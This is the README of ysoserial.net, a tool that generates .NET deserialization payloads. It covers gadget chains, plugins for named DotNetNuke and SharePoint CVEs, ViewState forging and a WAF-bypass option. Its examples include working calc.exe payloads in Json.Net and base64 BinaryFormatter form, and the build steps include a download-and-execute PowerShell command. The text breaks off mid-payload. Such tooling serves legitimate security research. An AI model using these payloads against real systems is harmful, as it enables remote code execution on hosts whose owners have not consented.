![logo](/logo.png)
---
![GitHub CI](https://github.com/pwntester/ysoserial.net/workflows/Build/badge.svg?branch=master)
[![v2](https://img.shields.io/azure-devops/build/alvaro0002/ysoserial.net/1/v2.svg?label=v2%20branch)](https://dev.azure.com/alvaro0002/ysoserial.net/_build/latest?definitionId=1&branchName=v2)
[![download](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/pwntester/ysoserial.net/releases/latest)
[![license](https://img.shields.io/github/license/pwntester/ysoserial.net.svg)](LICENSE.txt)
![stars](https://img.shields.io/github/stars/pwntester/ysoserial.net.svg?style=social)
![forks](https://img.shields.io/github/forks/pwntester/ysoserial.net.svg?style=social)

A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

## Description
ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.

This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)

## Disclaimer 
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

This software is a personal project and not related with any companies, including Project owner and contributors employers.

## Installation
In order to obtain the latest version, it is recommended to download it from [the Actions page](https://github.com/pwntester/ysoserial.net/actions).

You can install the previous releases of YSoSerial.NET from [the releases page](https://github.com/pwntester/ysoserial.net/releases)

## Build from source:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install visualstudio2022community --yes
choco install visualstudio2022-workload-nativedesktop --yes
choco install choco install msbuild.communitytasks --yes
choco install nuget.commandline --yes
choco install git --yes

git clone https://github.com/pwntester/ysoserial.net
cd ysoserial.net
nuget restore ysoserial.sln
msbuild ysoserial.sln -p:Configuration=Release

.\ysoserial\bin\Release\ysoserial.exe -h
```


## Usage
```
$ ./ysoserial.exe --fullhelp
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

== GADGETS ==
        (*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Not bridge but derived
                        Extra options:
                              --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator
                                                       [default], 2 -> use
                                                       TextFormattingRunPropertiesMarshal

        (*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class]
                Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
                        Labels: Not bridge or derived
                        Extra options:
                              --var, --variant=VALUE Payload variant number where applicable.
                                                       Choices: 1 (default), 2 (shorter but may not
                                                       work between versions)

        (*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll']
                Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
                        Labels: Not bridge or derived
                        Extra options:
                              --var, --variant=VALUE Payload variant number where applicable.
                                                       Choices: 1 (default), 2 (shorter but may not
                                                       work between versions)

        (*) AxHostState
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) BaseActivationFactory [Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)]
                Formatters: Json.Net
                        Labels: Not bridge or derived, .NET 5/6/7, Requires WPF enabled or PresentationFramework.dll
        (*) ClaimsIdentity
                Formatters: BinaryFormatter , LosFormatter , SoapFormatter
                        Labels: Bridge and derived, OnDeserialized
                        Supported formatter for the bridge: BinaryFormatter
        (*) ClaimsPrincipal
                Formatters: BinaryFormatter , LosFormatter , SoapFormatter
                        Labels: Bridge and derived, OnDeserialized, SecondOrderDeserialization
                        Supported formatter for the bridge: BinaryFormatter
        (*) DataSet
                Formatters: BinaryFormatter , LosFormatter , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) DataSetOldBehaviour [This gadget targets and old behaviour of DataSet which uses XML format]
                Formatters: BinaryFormatter , LosFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: LosFormatter
                        Extra options:
                              --spoofedAssembly=VALUE
                                                     The assembly name you want to use in the
                                                       generated serialized object (example: 'mscorlib')

        (*) DataSetOldBehaviourFromFile [Another variant of the DataSetOldBehaviour gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll']
                Formatters: BinaryFormatter , LosFormatter
                        Labels: Bridge and derived
                        Extra options:
                              --spoofedAssembly=VALUE
                                                     The assembly name you want to use in the
                                                       generated serialized object (example: 'mscorlib')

        (*) DataSetTypeSpoof [A more advanced type spoofing which can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget]
                Formatters: BinaryFormatter , LosFormatter , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) GenericPrincipal
                Formatters: BinaryFormatter , LosFormatter
                        Labels: Bridge and derived, OnDeserialized, SecondOrderDeserialization
                        Supported formatter for the bridge: BinaryFormatter
                        Extra options:
                              --var, --variant=VALUE Payload variant number where applicable.
                                                       Choices: 1 (uses serialized ClaimsIdentities), 2
                                                       (uses serialized Claims)

        (*) GetterCompilerResults [Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework. DLL path delivered with -c argument]
                Formatters: Json.Net
                        Labels: Chain of arbitrary getter call and not derived gadget, Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework
                        Extra options:
                              --var, --variant=VALUE Variant number. Variant defines a different
                                                       getter-call gadget. Choices:
                                                       1 (default) - PropertyGrid getter-call gadget,
                                                       2 - ComboBox getter-call gadget
                                                       3 - ListBox getter-call gadget
                                                       4 - CheckedListBox getter-call gadget

        (*) GetterSecurityException
                Formatters: Json.Net
                        Labels: Chain of arbitrary getter call and derived gadget
                        Extra options:
                              --var, --variant=VALUE Variant number. Variant defines a different
                                                       getter-call gadget. Choices:
                                                       1 (default) - PropertyGrid getter-call gadget,
                                                       2 - ComboBox getter-call gadget
                                                       3 - ListBox getter-call gadget
                                                       4 - CheckedListBox getter-call gadget

        (*) GetterSettingsPropertyValue
                Formatters: Json.Net , MessagePackTypeless >= 2.3.75 , MessagePackTypelessLz4 >= 2.3.75 , Xaml
                        Labels: Chain of arbitrary getter call and derived gadget
                        Extra options:
                              --var, --variant=VALUE Variant number. Variant defines a different
                                                       getter-call gadget. Choices:
                                                       1 (default) - PropertyGrid getter-call gadget,
                                                       2 - ComboBox getter-call gadget
                                                       3 - ListBox getter-call gadget
                                                       4 - CheckedListBox getter-call gadget

        (*) ObjectDataProvider
                Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , MessagePackTypeless >= 2.3.75 , MessagePackTypelessLz4 >= 2.3.75 , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0
                        Labels: Not bridge or derived
                        Extra options:
                              --var, --variant=VALUE Payload variant number where applicable.
                                                       Choices: 1, 2, 3, ... based on formatter.
                              --xamlurl=VALUE        This is to create a very short payload when
                                                       affected box can read the target XAML URL e.g.
                                                       "http://b8.ee/x" (can be a file path on a shared
                                                       drive or the local system). This is used by the
                                                       3rd XAML payload which is a ResourceDictionary
                                                       with the Source parameter. Command parameter
                                                       will be ignored. The shorter the better!

        (*) ObjRef
                Formatters: BinaryFormatter , LosFormatter , ObjectStateFormatter , SoapFormatter
                        Labels:
        (*) PSObject [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)]
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Not bridge but derived
        (*) ResourceSet
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
                        Labels: It relies on other gadgets and is not a real gadget on its own (not bridged or derived either)
                        Extra options:
                              --ig, --internalgadget=VALUE
                                                     The numerical internal gadget choice to use:
                                                       1=TypeConfuseDelegate,
                                                       2=TextFormattingRunProperties (default: 1
                                                       [TypeConfuseDelegate])

        (*) RolePrincipal
                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) SessionSecurityToken
                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) SessionViewStateHistoryItem
                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: LosFormatter
        (*) TextFormattingRunProperties [This normally generates the shortest payload]
                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Not bridge but derived
                        Extra options:
                              --xamlurl=VALUE        This is to create a very short payload when
                                                       affected box can read the target XAML URL e.g.
                                                       "http://b8.ee/x" (can be a file path on a shared
                                                       drive or the local system). This is used by the
                                                       3rd XAML payload of ObjectDataProvider which is
                                                       a ResourceDictionary with the Source parameter.
                                                       Command parameter will be ignored. The shorter
                                                       the better!
                              --hasRootDCS           To include a root element with the
                                                       DataContractSerializer payload.

        (*) ToolboxItemContainer
                Formatters: BinaryFormatter , LosFormatter , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) TypeConfuseDelegate
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
                        Labels: Not bridge or derived
        (*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono]
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
                        Labels: Not bridge or derived
        (*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)]
                Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)
                        Labels: Bridge and derived, Not in GAC
                        Supported formatter for the bridge: BinaryFormatter
                        Extra options:
                              --var, --variant=VALUE Payload variant number where applicable.
                                                       Choices: 1, 2, or 3 based on formatter.

        (*) WindowsIdentity
                Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
                        Supported formatter for the bridge: BinaryFormatter
        (*) WindowsPrincipal
                Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Bridge and derived
        (*) XamlAssemblyLoadFromFile [Loads assembly using XAML. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll']
                Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter
                        Labels: Not bridge but derived
                        Extra options:
                              --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator
                                                       [default], 2 -> use
                                                       TextFormattingRunPropertiesMarshal

        (*) XamlImageInfo [Gadget leads to XAML deserialization. Variant 1 (GAC) reads XAML from file (local path or UNC path can be given). Variant 2 (non-GAC) delivers XAML directly, but requires Microsoft.Web.Deployment.dll]
                Formatters: Json.Net
                        Labels: Not bridge but derived, Variant 1 in GAC, Variant 2 not in GAC
                        Extra options:
                              --var, --variant=VALUE Variant number. Variant defines a different
                                                       Stream delivery class. Choices:
                                                       1 (default and GAC) - LazyFileStream for Stream
                                                       delivery, file path has to be provided for -c
                                                       argument (UNC or local)
                                                       2 (non-GAC, requires Microsoft.Web.Deploymen-
                                                       t.dll) - ReadOnlyStreamFromStrings for Stream
                                                       delivery, command to execute can be provided for
                                                       -c argument


== PLUGINS ==
        (*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
                Options:
                  -c, --command=VALUE        the command to be executed.
                  -u, --url=VALUE            the url passed to Activator.GetObject.
                  -s                         if TCPChannel security should be enabled.

        (*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
                Options:
                  -M, --mode=VALUE           the payload mode: HttpStaticObjectsCollection or
                                               SessionStateItemCollection. Default:
                                               HttpStaticObjectsCollection
                  -o, --output=VALUE         the output format (raw|base64).
                  -c, --command=VALUE        the command to be executed
                  -t, --test                 whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)
                Options:
                  -c, --command=VALUE        the command to be executed
                  -t, --test                 whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
                Options:
                  -F, --format=VALUE         the object format: Csv, DeviceIndependentBitmap,
                                               DataInterchangeFormat, PenData, RiffAudio,
                                               WindowsForms10PersistentObject, System.String,
                                               SymbolicLink, TaggedImageFileFormat, WaveAudio.
                                               Default: WindowsForms10PersistentObject (the
                                               only one that works in Feb 2020 as a result of
                                               an incomplete silent patch - - will not be
                                               useful to target text based fields anymore)
                  -c, --command=VALUE        the command to be executed
                  -t, --test                 whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
                Options:
                  -m, --mode=VALUE           the payload mode: read_file, write_file,
                                               run_command.
                  -c, --command=VALUE        the command to be executed in run_command mode.
                  -u, --url=VALUE            the url to fetch the file from in write_file
                                               mode.
                  -f, --file=VALUE           the file to read in read_file mode or the file
                                               to write to in write_file_mode.
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false

        (*) GetterCallGadgets (Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled)
                Options:
                  -l                         prints list of implemented gadgets
                  -i, --inner=VALUE          file containing inner-gadget
                  -g, --gadget=VALUE         gadget to use
                  -m, --member=VALUE         getter to call (required for some gadgets)
                  -t                         test gadget (execute)

        (*) NetNonRceGadgets (Implements Non-RCE gadgets for .NET Framework)
                Options:
                  -l                         prints list of implemented gadgets
                  -i, --input=VALUE          input to the gadget
                  -g, --gadget=VALUE         gadget to use
                  -f, --formatter=VALUE      Formatter to use
                  -t                         test gadget (execute after generation)

        (*) Resx (Generates RESX and .RESOURCES files)
                Options:
                  -M, --mode=VALUE           the payload mode: indirect_resx_file,
                                               CompiledDotResources (useful for CVE-2020-0932
                                               for example), BinaryFormatter, SoapFormatter.
                  -c, --command=VALUE        the command to be executed in BinaryFormatter
                                               and CompiledDotResources. If this is provided
                                               for SoapFormatter, it will be used as a file for
                                               ActivitySurrogateSelectorFromFile
                  -g, --gadget=VALUE         The gadget chain used for BinaryFormatter and
                                               CompiledDotResources (default:
                                               TextFormattingRunProperties).
                  -F, --file=VALUE           UNC file path location: this is used in
                                               indirect_resx_file mode.
                      --of, --outputfile=VALUE
                                             a file path location for CompiledDotResources to
                                               store the .resources file (default: payloa-
                                               d.resources)
                  -t, --test                 Whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
                Options:
                  -c, --command=VALUE        the command to be executed e.g. "cmd /c calc"
                  -t, --test                 whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) SharePoint (Generates payloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421)
                Options:
                      --cve=VALUE            the CVE reference: CVE-2020-1147 (result is safe
                                               for a POST request), CVE-2019-0604, CVE-2018-8421
                      --useurl               to use the XAML url rather than using the direct
                                               command in CVE-2019-0604 and CVE-2018-8421
                  -g, --gadget=VALUE         a gadget chain that supports LosFormatter for
                                               CVE-2020-1147. Default: TypeConfuseDelegate
                  -c, --command=VALUE        the command to be executed e.g. "cmd /c calc" or
                                               the XAML url e.g. "http://b8.ee/x" to make the
                                               payload shorter with the `--useurl` argument

        (*) ThirdPartyGadgets (Implements gadgets for 3rd Party Libraries)
                Options:
                  -l                         prints list of implemented gadgets
                  -i, --input=VALUE          input to the gadget
                  -g, --gadget=VALUE         gadget to use
                  -f, --formatter=VALUE      formatter to use
                  -r                         removes version and pubkeytoken from types, it
                                               may be useful when we do not know version of
                                               targetd library or require short payload
                  -t                         test gadget (execute after generation)

        (*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
                Options:
                  -c, --command=VALUE        the command to be executed
                  -t, --test                 whether to run payload locally. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true

        (*) ViewState (Generates a ViewState using known MachineKey parameters)
                Options:
                      --examples             to show a few examples. Other parameters will be
                                               ignored
                  -g, --gadget=VALUE         a gadget chain that supports LosFormatter.
                                               Default: ActivitySurrogateSelector
                  -c, --command=VALUE        the command suitable for the used gadget (will
                                               be ignored for ActivitySurrogateSelector)
                  -s, --stdin                The command to be executed will be read from
                                               standard input.
                      --upayload=VALUE       the unsigned LosFormatter payload in (base64
                                               encoded). The gadget and command parameters will
                                               be ignored
                      --generator=VALUE      the __VIEWSTATEGENERATOR value which is in HEX,
                                               useful for .NET <= 4.0. When not empty, 'legacy'
                                               will be used and 'path' and 'apppath' will be
                                               ignored.
                      --path=VALUE           the target web page. example: /app/folder1/pag-
                                               e.aspx
                      --apppath=VALUE        the application path. this is needed in order to
                                               simulate TemplateSourceDirectory
                      --islegacy             when provided, it uses the legacy algorithm
                                               suitable for .NET 4.0 and below
                      --isencrypted          this will be used when the legacy algorithm is
                                               used to bypass WAFs
                      --viewstateuserkey=VALUE
                                             this to set the ViewStateUserKey parameter that
                                               sometimes used as the anti-CSRF token
                      --decryptionalg=VALUE  the encryption algorithm can be set to  DES,
                                               3DES, AES. Default: AES
                      --decryptionkey=VALUE  this is the decryptionKey attribute from
                                               machineKey in the web.config file
                      --validationalg=VALUE  the validation algorithm can be set to SHA1,
                                               HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES,
                                               AES. Default: HMACSHA256
                      --validationkey=VALUE  this is the validationKey attribute from
                                               machineKey in the web.config file
                      --showraw              to stop URL-encoding the result. Default: false
                      --minify               Whether to minify the payloads where applicable
                                               (experimental). Default: false
                      --ust, --usesimpletype This is to remove additional info only when
                                               minifying and FormatterAssemblyStyle=Simple.
                                               Default: true
                      --isdebug              to show useful debugging messages!


Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

Usage: ysoserial.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64-urlencode|hex). Default: raw
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Whether to run payload locally. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Whether to minify the payloads where applicable.
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided
                               formatter (ignores gadget name, output format,
                               and the test flag arguments). This will search
                               in formatters and also show the displayed
                               payload length. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --debugmode            Enable debugging to show exception errors and
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets
                               and plugins and exit.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

*Note:* When specifying complex commands, it can be tedious to escape some special character (;, |, &, ..). Use stdin option (-s) to read the command from stdin:

```
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
```

*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the "type" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.

## Plugins
Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:

```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
```

For more help on plugin options use `-h` along with `-p <plugin name>`. Eg:

```
$ ./ysoserial.exe -h -p DotNetNuke

ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, write_file, run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file mode.
  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.
      --minify               Whether to minify the payloads where applicable (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true
```

## Examples

### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.
```
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.
```
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3